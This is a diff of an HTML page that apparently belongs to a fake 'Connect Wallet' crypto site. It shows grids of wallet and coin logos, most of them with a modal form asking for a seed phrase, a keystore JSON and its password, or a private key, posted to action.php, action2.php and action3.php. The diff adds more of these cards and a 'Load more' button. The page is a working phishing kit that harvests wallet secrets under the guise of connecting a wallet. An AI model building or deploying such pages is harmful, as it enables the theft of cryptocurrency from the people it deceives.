@@ -29,15 +29,8 @@
 <div class="collapse navbar-collapse" id="navbarSupportedContent">
 <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
 <li class="nav-item">
-<a class="nav-link" aria-current="page" href="index.html">Home</a>
+<a class="nav-link btn" style="background-color: orange; padding: 10px; color: #fff;" aria-current="page" href="index.html">Home</a>
 </li>
-<li class="nav-item">
-<a class="nav-link" href="#">exchange</a>
-</li>
-<li class="nav-item">
-<a class="nav-link" href="#">contact</a>
-</li>
-
 </ul>
 </div>
 </div>
@@ -48,8 +41,9 @@
 
 <section class="our_blog" style="margin-top: 90px;">
 <div class="container">
-<div class="row blog_box original">
-<div class="col-md-4 pb-4">
+  <!-- <input type="checkbox" id="btnBox"> -->
+<div class="row blog_box">
+<div class="col-md-4 pb-4 ">
 <div class="blog_img">
 <img src="SelectWallet/img-1.jpg"  class="img-fluid" alt="">
 <div class="icon">
@@ -143,6 +137,7 @@ Several lines of text beginning with "{...}" plus the password you used to encry
 </div>
 </div>
 </div>
+
 </div>
 
 <div class="col-md-4 pb-4">
@@ -302,260 +297,14 @@ Several lines of text beginning with "{...}" plus the password you used to encry
 </div>
 </div>
 
-<div class="row blog_box">
+<button class="bat">Load more</button>
 
-    <div class="col-md-4 pb-4">
-    <div class="blog_img">
-    <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
-    <div class="icon">
-    <i class="fas fa-pen"></i>
-    </div>
-    </div>
-    <div class="content">
-    <div class="authore">
-    <p>by admin</p>
-    <!-- <p>22/08/2021</p> -->
-    </div>
-    <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
-    <button type="button"  class="" style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
-    
-    
-    <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-    <div class="modal-dialog">
-    <div class="modal-content">
-    <div class="modal-header">
-    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-    </div>
-    <div class="modal-body">
-    <div class="container-fluid">
-    <div class="row">
-    <div class="col-md-4 offset-md-4">
-    <ul style="display: flex;list-style: none;text-align: left;">
-    <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
-    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
-    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
-    </ul>
-    </div>
-    </div>
-    </div>
-    <div class="tab-content">
-    <div role="tabpanel" class="tab-pane fade show active" id="phrase">
-    <form method="post" action="action.php">
-    <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
-    <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    <div role="tabpanel" class="tab-pane fade" id="keystore">
-    <form method="post" action="action2.php">
-    <div class="form-group">
-    <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
-    </div>
-    <div class="form-group">
-    <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
-    </div>
-    <p class="text-secondary" style="margin-top: 10px;">
-    Several lines of text beginning with "{...}" plus the password you used to encrypt it.
-    </p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    <div role="tabpanel" class="tab-pane fade" id="privatekey">
-    <form method="post" action="action3.php">
-    <div class="form-group">
-    <input class="form-control" name="privatekey" placeholder="Private Key" required="">
-    </div>
-    <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    </div>
-    </div>
-    <div class="modal-footer">
-    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-    <!-- <button type="button" class="btn btn-primary">Send message</button> -->
-    </div>
-    </div>
-    </div>
-    </div>
-    </div>
-    </div>
-    
-    <div class="col-md-4 pb-4">
-    <div class="blog_img">
-    <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
-    <div class="icon">
-    <i class="fas fa-pen"></i>
-    </div>
-    </div>
-    <div class="content">
-    <div class="authore">
-    <p>by admin</p>
-    <!-- <p>22/08/2021</p> -->
-    </div>
-    <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
-    <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
-    
-    
-    <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-    <div class="modal-dialog">
-    <div class="modal-content">
-    <div class="modal-header">
-    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-    </div>
-    <div class="modal-body">
-    <div class="container-fluid">
-    <div class="row">
-    <div class="col-md-4 offset-md-4">
-    <ul style="display: flex;list-style: none;text-align: left;">
-    <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
-    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
-    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
-    </ul>
-    </div>
-    </div>
-    </div>
-    <div class="tab-content">
-    <div role="tabpanel" class="tab-pane fade show active" id="phrase">
-    <form method="post" action="action.php">
-    <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
-    <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    <div role="tabpanel" class="tab-pane fade" id="keystore">
-    <form method="post" action="action2.php">
-    <div class="form-group">
-    <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
-    </div>
-    <div class="form-group">
-    <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
-    </div>
-    <p class="text-secondary" style="margin-top: 10px;">
-    Several lines of text beginning with "{...}" plus the password you used to encrypt it.
-    </p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    <div role="tabpanel" class="tab-pane fade" id="privatekey">
-    <form method="post" action="action3.php">
-    <div class="form-group">
-    <input class="form-control" name="privatekey" placeholder="Private Key" required="">
-    </div>
-    <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    </div>
-    </div>
-    <div class="modal-footer">
-    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-    <!-- <button type="button" class="btn btn-primary">Send message</button> -->
-    </div>
-    </div>
-    </div>
-    </div>
-    </div>
-    </div>
-    
-    <div class="col-md-4 pb-4">
-    <div class="blog_img">
-    <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
-    <div class="icon">
-    <i class="fas fa-pen"></i>
-    </div>
-    </div>
-    <div class="content">
-    <div class="authore">
-    <p>by admin</p>
-    <!-- <p>22/08/2021</p> -->
-    </div>
-    <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
-    <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
-    
-    
-    <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-    <div class="modal-dialog">
-    <div class="modal-content">
-    <div class="modal-header">
-    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-    </div>
-    <div class="modal-body">
-    <div class="container-fluid">
-    <div class="row">
-    <div class="col-md-4 offset-md-4">
-    <ul style="display: flex;list-style: none;text-align: left;">
-    <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
-    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
-    <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
-    </ul>
-    </div>
-    </div>
-    </div>
-    <div class="tab-content">
-    <div role="tabpanel" class="tab-pane fade show active" id="phrase">
-    <form method="post" action="action.php">
-    <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
-    <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    <div role="tabpanel" class="tab-pane fade" id="keystore">
-    <form method="post" action="action2.php">
-    <div class="form-group">
-    <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
-    </div>
-    <div class="form-group">
-    <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
-    </div>
-    <p class="text-secondary" style="margin-top: 10px;">
-    Several lines of text beginning with "{...}" plus the password you used to encrypt it.
-    </p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    <div role="tabpanel" class="tab-pane fade" id="privatekey">
-    <form method="post" action="action3.php">
-    <div class="form-group">
-    <input class="form-control" name="privatekey" placeholder="Private Key" required="">
-    </div>
-    <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
-    <input type="hidden" name="value" value="Ethereum">
-    <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
-    </form>
-    </div>
-    </div>
-    </div>
-    <div class="modal-footer">
-    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-    <button type="button" class="btn btn-primary">Send message</button>
-    </div>
-    </div>
-    </div>
-    </div>
-    </div>
-    </div>
-    
-</div> 
-
-<input type="checkbox" id="btn" />
-<label for="btn"></label>
-
-<div class="readmore">
   <!-- 1 -->
   <div class="row blog_box">
 
-    <div class="col-md-4 pb-4">
-    <div class="blog_img">
-    <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+    <div class="col-md-4 pb-4 extra">
+    <div class="blog_img extra">
+    <img src="SelectWallet/img-20.jpg"  class="img-fluid" alt="">
     <div class="icon">
     <i class="fas fa-pen"></i>
     </div>
@@ -633,9 +382,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
     </div>
     </div>
     
-    <div class="col-md-4 pb-4">
-    <div class="blog_img">
-    <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+    <div class="col-md-4 pb-4 extra">
+    <div class="blog_img extra">
+    <img src="SelectWallet/img-21.jpg"  class="img-fluid" alt="">
     <div class="icon">
     <i class="fas fa-pen"></i>
     </div>
@@ -713,9 +462,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
     </div>
     </div>
     
-    <div class="col-md-4 pb-4">
+    <div class="col-md-4 pb-4 extra">
     <div class="blog_img">
-    <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+    <img src="SelectWallet/img-22.jpg"  class="img-fluid" alt="">
     <div class="icon">
     <i class="fas fa-pen"></i>
     </div>
@@ -798,7 +547,7 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 2 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
   <img src="SelectWallet/safemoon.png"  class="img-fluid" alt="">
   <div class="icon">
@@ -878,9 +627,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/013e3e71441eaf78044b05f30544cac56ea91a5e5a8a39b62bd0b80808de00da.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -958,9 +707,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/02563239502b03cef22f5e71059ce97bd48cf7ab0f856964d7e17c0e3631db9f.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -1040,9 +789,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   
 </div>
  <!-- 3 -->
- <div class="row blog_box">
+ <div class="row blog_box ">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
   <img src="SelectWallet/vechain.png"  class="img-fluid" alt="">
   <div class="icon">
@@ -1122,9 +871,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/02563239502b03cef22f5e71059ce97bd48cf7ab0f856964d7e17c0e3631db9f.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -1202,9 +951,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -1286,7 +1035,7 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 4 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
   <img src="SelectWallet/velas.png"  class="img-fluid" alt="">
   <div class="icon">
@@ -1366,7 +1115,7 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
   <img src="SelectWallet/tron.png"  class="img-fluid" alt="">
   <div class="icon">
@@ -1446,7 +1195,7 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
   <img src="SelectWallet/safepal.png"  class="img-fluid" alt="">
   <div class="icon">
@@ -1530,7 +1279,7 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 5 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
   <img src="SelectWallet/img11.jpg"  class="img-fluid" alt="">
   <div class="icon">
@@ -1610,7 +1359,7 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
   <img src="SelectWallet/crypto.png"  class="img-fluid" alt="">
   <div class="icon">
@@ -1690,9 +1439,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/09c4e2ebc81a6a76c05d0c62f797151732fa9c0b84ef92654cd438849271e44b.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -1774,9 +1523,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 6 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -1854,9 +1603,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/0cc13b1d63976ca5dd90dcbfb234e95f69d4edde6a24cbcd09683a5fd944040e.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -1934,9 +1683,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/0e680e620e7a8d15a8048aa6d9a825e07291a1da23a82ced661aa96ed2e81998.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2018,9 +1767,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 7 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2098,9 +1847,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/0fbcea2de72eee88bb00512395fb1e99388ffbb1746cdf01dffc6797d4f06bfd.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2178,9 +1927,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2262,9 +2011,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 8 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2342,9 +2091,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2422,9 +2171,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2504,11 +2253,11 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   
 </div>
  <!-- 9 -->
- <div class="row blog_box">
+ <div class="row blog_box ">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2586,9 +2335,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/1fe0c2ed2ddd10d7caf2db5d873a8fde1817dff12a29dff0e9c59e99ee8cd8a4.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2666,9 +2415,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/21ab23fb856af690a4cd42ec6505a1398b571da2a772717ad3f0e047f34cced7.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2750,9 +2499,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 10 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/253aedf09361b7d0d90b33107079635554ad56807d9f0a6edd95891a45eca990.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2830,9 +2579,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/2871556630e7ed3588218a4279561f71735b7567c3e48b2f80b2a7705c51e0c3.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2910,9 +2659,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/2d7b5ef9ea6e5b856440ad38ac3e9ffc6e311f353aae4a90daadf4654e31ffb7.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -2994,9 +2743,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 11 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/3ed8d78a90e1ecefae998f6f3d7fe968d0ac6c2ee7a092fe29bae3e9621f9a8f.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3074,9 +2823,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/492caa74c01551142885e2e5ecbe760f82e4c0206e8d3fe4d8c14477032b0412.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3154,9 +2903,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/44ff1e444b11207673bb2e832138afa0062e4618659189b9207990a7767dccdf.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3238,9 +2987,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
  <!-- 12 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/img-35.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3318,9 +3067,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/9c2a672e60f354708a3e622d7cf3fd11a25d7f8265f811ede376f599cc077102.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3398,9 +3147,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3479,12 +3228,12 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   
 </div>
- <!-- 1 -->
+ <!-- 13 -->
  <div class="row blog_box">
 
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-2.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3562,9 +3311,9 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-19.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/binance.jpg"  class="img-fluid" alt="">
   <div class="icon">
   <i class="fas fa-pen"></i>
   </div>
@@ -3642,9 +3391,253 @@ Several lines of text beginning with "{...}" plus the password you used to encry
   </div>
   </div>
   
-  <div class="col-md-4 pb-4">
+  <div class="col-md-4 pb-4 extra">
   <div class="blog_img">
-  <img src="SelectWallet/img-6.jpg"  class="img-fluid" alt="">
+  <img src="SelectWallet/8e96e3b538965f3bcac2836b6579df3a9de55ce69c49e5ac1a6889c8f0b8df7b.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
